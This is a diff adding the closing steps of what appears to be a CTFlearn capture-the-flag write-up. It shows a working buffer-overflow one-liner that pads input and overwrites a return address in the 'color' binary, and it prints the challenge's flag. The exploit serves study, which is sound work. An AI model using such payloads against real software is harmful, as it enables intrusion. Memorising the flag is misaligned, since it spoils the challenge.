@@ -139,6 +139,32 @@ int main(char argc, char** argv) {
 ![image](https://user-images.githubusercontent.com/70703371/194745898-4034d649-e5eb-4432-aa97-e1e21a65b79d.png)
 
 
-22. 
+22. Quit from gdb and write this script at the ssh terminal.
 
+> SCRIPT
+
+```py
+(python -c "print('A'*52 + '\x5f\x86\x04\x08')";cat) | ./color
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/194749310-02add362-daec-4a73-8087-03d76cee35a1.png)
+
+
+23. Now strings the `flag.txt` file.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/194749346-bf280e4e-e884-49a6-a207-4ef5402fec48.png)
+
+
+24. Finally! We got the flag!
+
+
+## FLAG
+
+```
+CTFlearn{c0lor_0f_0verf1ow}
+```
 
